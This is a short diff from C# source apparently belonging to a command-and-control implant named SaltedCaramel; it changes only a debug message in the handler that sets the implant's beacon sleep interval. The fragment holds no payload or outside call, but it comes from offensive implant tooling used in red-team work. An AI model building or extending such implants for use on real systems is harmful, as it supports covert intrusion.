@@ -84,7 +84,7 @@ namespace SaltedCaramel
                 try
                 {
                     int sleep = Convert.ToInt32(this.@params);
-                    Debug.WriteLine("[-] Tasked to change sleep to: " + sleep);
+                    Debug.WriteLine("[-] DispatchTask - Tasked to change sleep to: " + sleep);
                     implant.sleep = sleep * 1000;
                     implant.SendComplete(this.id);
                 }
